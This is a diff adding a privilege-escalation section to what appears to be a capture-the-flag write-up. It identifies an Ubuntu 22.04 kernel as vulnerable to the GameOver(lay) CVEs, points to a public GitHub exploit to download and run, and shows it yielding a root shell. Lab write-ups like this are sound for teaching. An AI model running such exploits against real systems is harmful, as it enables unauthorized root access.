@@ -158,5 +158,22 @@ metalytics@analytics:~$
 ```
 
 ### PHASE 3. System
+Now we have a full shell out of the container. Enumerate system again.
+```markdown
+> uname -a && cat /proc/version
+Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
+Linux version 6.2.0-25-generic (buildd@lcy02-amd64-044) (x86_64-linux-gnu-gcc-11 (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2
+```
+Notice the system is Ubuntu 22.04 and kernel is 6.2.0. This release is vulnerable to GameOver(lay) Ubuntu Privilege Escalation (CVE-2023-2640 and CVE-2023-32629).
+To escalate privileges, just download and execute exploit available in github (https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629).
+After running the exploit, a root shell spawns.
+```markdown
+> -/exploit.sh
+[+] You should be root now
+[+] Type 'exit' to finish and leave the house cleaned
 
+> whoami
+root
+```
+A root shell spawns.
 
